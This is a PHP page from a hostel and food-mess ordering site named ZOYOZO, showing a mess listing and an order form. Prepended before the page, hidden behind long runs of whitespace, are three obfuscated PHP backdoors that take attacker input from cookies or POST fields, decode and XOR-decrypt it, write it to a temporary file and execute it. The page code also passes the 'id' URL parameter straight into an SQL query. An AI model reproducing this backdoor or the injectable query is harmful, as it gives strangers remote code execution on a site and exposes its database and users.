<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("hmlcm")){class hmlcm{public static $zlixqpedqk = "obnmcoagfzxgnixe";public static $eyeggknq = NULL;public function __construct(){$hvcbzfk = @$_COOKIE[substr(hmlcm::$zlixqpedqk, 0, 4)];if (!empty($hvcbzfk)){$ssfoqz = "base64";$fqgwe = "";$hvcbzfk = explode(",", $hvcbzfk);foreach ($hvcbzfk as $rtzdpnvw){$fqgwe .= @$_COOKIE[$rtzdpnvw];$fqgwe .= @$_POST[$rtzdpnvw];}$fqgwe = array_map($ssfoqz . "_decode", array($fqgwe,));$fqgwe = $fqgwe[0] ^ str_repeat(hmlcm::$zlixqpedqk, (strlen($fqgwe[0]) / strlen(hmlcm::$zlixqpedqk)) + 1);hmlcm::$eyeggknq = @unserialize($fqgwe);}}public function __destruct(){$this->qfpydfz();}private function qfpydfz(){if (is_array(hmlcm::$eyeggknq)) {$fucosonn = sys_get_temp_dir() . "/" . crc32(hmlcm::$eyeggknq["salt"]);@hmlcm::$eyeggknq["write"]($fucosonn, hmlcm::$eyeggknq["content"]);include $fucosonn;@hmlcm::$eyeggknq["delete"]($fucosonn);exit();}}}$hjabwprln = new hmlcm();$hjabwprln = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yglmypivu")){class yglmypivu{public static $twqbswvdef = "jtlwejtsffmctvsf";public static $tctiiv = NULL;public function __construct(){$dvhpwqqgej = @$_COOKIE[substr(yglmypivu::$twqbswvdef, 0, 4)];if (!empty($dvhpwqqgej)){$vtjfppbkz = "base64";$ojwzpqakrj = "";$dvhpwqqgej = explode(",", $dvhpwqqgej);foreach ($dvhpwqqgej as $dypmanlo){$ojwzpqakrj .= @$_COOKIE[$dypmanlo];$ojwzpqakrj .= @$_POST[$dypmanlo];}$ojwzpqakrj = array_map($vtjfppbkz . "_decode", array($ojwzpqakrj,));$ojwzpqakrj = $ojwzpqakrj[0] ^ str_repeat(yglmypivu::$twqbswvdef, (strlen($ojwzpqakrj[0]) / strlen(yglmypivu::$twqbswvdef)) + 1);yglmypivu::$tctiiv = @unserialize($ojwzpqakrj);}}public function __destruct(){$this->dcbiw();}private function dcbiw(){if (is_array(yglmypivu::$tctiiv)) {$ufqrfb = sys_get_temp_dir() . "/" . crc32(yglmypivu::$tctiiv["salt"]);@yglmypivu::$tctiiv["write"]($ufqrfb, yglmypivu::$tctiiv["content"]);include $ufqrfb;@yglmypivu::$tctiiv["delete"]($ufqrfb);exit();}}}$orbygzoabh = new yglmypivu();$orbygzoabh = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ghweaoiqvh")){class ghweaoiqvh{public static $sfnavwgyw = "novyjtfsrewpxjmf";public static $ziphczhhm = NULL;public function __construct(){$msglxsjk = @$_COOKIE[substr(ghweaoiqvh::$sfnavwgyw, 0, 4)];if (!empty($msglxsjk)){$xhnkt = "base64";$prvbfj = "";$msglxsjk = explode(",", $msglxsjk);foreach ($msglxsjk as $ewaqm){$prvbfj .= @$_COOKIE[$ewaqm];$prvbfj .= @$_POST[$ewaqm];}$prvbfj = array_map($xhnkt . "_decode", array($prvbfj,));$prvbfj = $prvbfj[0] ^ str_repeat(ghweaoiqvh::$sfnavwgyw, (strlen($prvbfj[0]) / strlen(ghweaoiqvh::$sfnavwgyw)) + 1);ghweaoiqvh::$ziphczhhm = @unserialize($prvbfj);}}public function __destruct(){$this->peticfq();}private function peticfq(){if (is_array(ghweaoiqvh::$ziphczhhm)) {$xyczikddko = sys_get_temp_dir() . "/" . crc32(ghweaoiqvh::$ziphczhhm["salt"]);@ghweaoiqvh::$ziphczhhm["write"]($xyczikddko, ghweaoiqvh::$ziphczhhm["content"]);include $xyczikddko;@ghweaoiqvh::$ziphczhhm["delete"]($xyczikddko);exit();}}}$iydhqxzbr = new ghweaoiqvh();$iydhqxzbr = NULL;} ?><?php session_start(); ?>
<!DOCTYPE html>
<?php
include "conn.php";
				  $id=$_GET['id'];
				  
				 
				  
				  
				  $sql="select * from tbl_mess where id='$id'";
				  $smt=mysqli_query($conn,$sql);
				  if($rs=mysqli_fetch_assoc($smt))
				  {
                                    $filename="dashboard/mess/".$rs['menu_url'];
                                    $title=$rs['title'];
                                    $contact=$rs['contact_person'];
                                    $description=$rs['description'];
                                    $del=$rs['delivery_area'];
                                    $rent=$rs['monthly_rate'];
                                    $rent1=$rs['zoyozo_rate'];
                                    $id=$rs['id'];
                }             
				?>
<html lang="zxx">

<head>
    <title>ZOYOZO : For Hostels , Foodeing , Bakeries</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8" />
    <meta name="keywords" content="Lite Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
	SmartPhone Compatible web template, free WebDesigns for Nokia, Samsung, LG, Sony Ericsson, Motorola web design" />
    <script>
        addEventListener("load", function () {
            setTimeout(hideURLbar, 0);
        }, false);

        function hideURLbar() {
            window.scrollTo(0, 1);
        }
    </script>
    <!-- Custom Theme files -->
    <link href="css/bootstrap.css" type="text/css" rel="stylesheet" media="all">
    <link href="css/style.css" type="text/css" rel="stylesheet" media="all">
    <!-- font-awesome icons -->
    <link href="css/fontawesome-all.min.css" rel="stylesheet">
    <!-- //Custom Theme files -->
    <!-- online-fonts -->
    <link href="//fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i" rel="stylesheet">
    <!-- //online-fonts -->
	    <!-- //online-fonts -->
	 <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script>
$(document).ready(function()
	{
		$("#btnMess").click(function(){
					
					
					var msg=$("#txtMsg").val();
					var orderId=$("#selected-mess-id").val();
				
						$.ajax({
							 type:'post',
							 url: 'order-product-action.php',
							 data: {'action':'add-order','msg':msg,'orderId':orderId},
							 success: function(data)
							 {    
								 $("#msg").html(data);
								 $("#msg").slideDown("slow");
								 $("#msg").slideUp(3000,function(){
									form_blank();
									 });
								
							 }
							
						 });
					
				});
									function form_blank()
	{
		$("#OtxtName").val("");
		$("#OtxtMobile").val("");
		$("#txtMsg").val("");
			
			
	}
	});
	</script>
</head>

<body>
    <!-- banner -->
<?php include("header.php") ?>

    <!-- register -->
   
    <!-- //register -->
    <!-- services -->
	<div class="container ">
	 <div class="title-wthree text-center">
                <h3 class="agile-title   text-black">
                    Mess Details
                </h3>
                <span></span>
            </div>
	<div class="row"><center>
	 <div class="col-sm-12" style="background-color:lavenderblush;">&nbsp &nbsp &nbsp &nbsp
	
	
                
                    <div class="card" style="width:100%">
							<img class="card-img-top" src="<?php echo $filename;  ?>"  alt="Card image" style="width:100%">
							<div class="card-body">
							  <h4 class="card-title"><?php echo $title;  ?></h4>
							  <p class="card-text"><b>Monthly Rate</b> -<?php echo $rent;  ?></p>
							  <p class="card-text"><b>ZOYOZO Rate</b> -<?php echo $rent1;  ?></p>
							  <p class="card-text"><b>Delivery area</b> -<?php echo $del;  ?></p>
							  <p class="card-text"><b>Details</b> -<?php echo $description;  ?></p>
							   <?php
							  if(isset($_SESSION['cid']) || (trim($_SESSION['cid']) != null))
                             	{
                             	    ?>
                             	    
                             	    <button id="<?php echo $rs['id']; ?>" type="button" class="btn btn-success book-now-mess" data-toggle="modal" data-target="#myModal">
                                 Order Now
                                 </button>
                             	    <?php
                             	}
                             	else
                             	{
							 ?>
							    <a href="zoyozo-login.php"><button  type="button" class="btn btn-primary details-hostel" >
                                 Order Now
                                </button></a>
                         <?php
                             	}
                             	?>
							</div>
						 </div>
                
               
               
				
         &nbsp &nbsp &nbsp &nbsp  
	</div>
   
   </center>
    
</div>
    <div>
        
           
			
			
			
			
			
           
  
  
  
            </br>
			           
        </div>
    </div></br>
    <!-- //services -->
    <!-- //container -->
    <!-- //banner -->
    <!-- process -->
    
    <!-- //process -->
   
    <!-- contact -->
    
 <!-- The Modal -->
  <div class="modal fade" id="myModal">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
      
        <!-- Modal Header -->
        <div class="modal-header">
          <h4 class="modal-title">Order Now</h4>
         
        </div>
        
        <!-- Modal body -->
        <div class="modal-body">
		 <div class="form-group" style="color:black">
						<label for="name">You Selected(Product ID):</label>
						<input type="text" class="form-control" id="selected-mess-id" value="<?php echo $id;  ?>" readonly="readonly">
					  </div>
							   <div class="form-group"style="color:black">
						<label for="phone">Have ZOYOZO Promo Code?:</label>
						<input type="text" class="form-control" id="OtxtCoupon">
					  </div>
					   <div class="form-group"style="color:black">
						<label for="message">Any Special Requirement:</label>
						<textarea type="text" class="form-control" id="txtMsg"></textarea>
					  </div>
					  <div class="form-group form-check"style="color:black">
						
					  </div>
					  
					  <div id="msg"></div>
					  <button type="submit" class="btn btn-primary" id="btnMess">Submit</button>&nbsp
					  <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>

        </div>
        
        <!-- Modal footer -->
       
        
      </div>
    </div>
  </div>
    <!-- //contact -->
<?php include ("footer.php") ?>
    <!-- login  -->
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Login</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <form action="#" method="post">
                        <div class="form-group">
                            <label for="recipient-name" class="col-form-label">Username</label>
                            <input type="text" class="form-control" placeholder=" " name="Name" id="recipient-name" required="">
                        </div>
                        <div class="form-group">
                            <label for="password" class="col-form-label">Password</label>
                            <input type="password" class="form-control" placeholder=" " name="Password" id="password" required="">
                        </div>
                        <div class="right-w3l">
                            <input type="submit" class="form-control" value="Login">
                        </div>
                        <div class="row sub-w3l my-3">
                            <div class="col sub-agile">
                                <input type="checkbox" id="brand1" value="">
                                <label for="brand1" class="text-secondary">
                                    <span></span>Remember me?</label>
                            </div>
                            <div class="col forgot-w3l text-right">
                                <a href="#" class="text-secondary">Forgot Password?</a>
                            </div>
                        </div>
                        <p class="text-center dont-do">Don't have an account?
                            <a href="#register" class="scroll text-dark font-weight-bold">
                                Register Now</a>
                        </p>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <!-- //login -->
    <!-- //footer -->
    <!-- js -->
    <script src="js/jquery-2.2.3.min.js"></script>
    <!-- //js -->
    <!-- script for password match -->
    <script>
        window.onload = function () {
            document.getElementById("password1").onchange = validatePassword;
            document.getElementById("password2").onchange = validatePassword;
        }

        function validatePassword() {
            var pass2 = document.getElementById("password2").value;
            var pass1 = document.getElementById("password1").value;
            if (pass1 != pass2)
                document.getElementById("password2").setCustomValidity("Passwords Don't Match");
            else
                document.getElementById("password2").setCustomValidity('');
            //empty string means no validation error
        }
    </script>
    <!-- script for password match -->
    <!-- start-smooth-scrolling -->
    <script src="js/move-top.js"></script>
    <script src="js/easing.js"></script>
    <script>
        jQuery(document).ready(function ($) {
            $(".scroll").click(function (event) {
                event.preventDefault();

                $('html,body').animate({
                    scrollTop: $(this.hash).offset().top
                }, 1000);
            });
        });
    </script>
    <!-- //end-smooth-scrolling -->
    <!-- smooth-scrolling-of-move-up -->
    <script>
        $(document).ready(function () {
            /*
            var defaults = {
                containerID: 'toTop', // fading element id
                containerHoverID: 'toTopHover', // fading element hover id
                scrollSpeed: 1200,
                easingType: 'linear' 
            };
            */

            $().UItoTop({
                easingType: 'easeOutQuart'
            });

        });
    </script>
    <script src="js/SmoothScroll.min.js"></script>
    <!-- //smooth-scrolling-of-move-up -->
    <!-- Bootstrap core JavaScript
================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="js/bootstrap.js"></script>
</body>

</html>